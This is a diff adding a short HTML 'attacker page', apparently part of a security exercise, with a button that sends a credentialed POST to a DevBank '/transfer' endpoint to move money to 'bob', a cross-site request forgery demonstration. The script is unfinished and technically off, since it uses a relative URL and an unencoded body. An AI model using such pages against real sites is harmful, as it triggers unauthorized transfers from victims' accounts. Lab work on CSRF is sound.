@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Attacker page</h1>
+
+    <button id="csrf_btn">Trigger request</button>
+
+    <script>
+        document.getElementById("csrf_btn").addEventListener("click", () => {
+            // TODO: add req js
+            // Submit a cross-origin request to the DevBank state-changing endpoint.
+            
+            fetch("/transfer", {
+                method: "POST",
+                credentials: "include",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: {
+                    to: "bob",
+                    amount: "100"
+                }
+            });
+        });
+    </script>
+</body>
+</html>
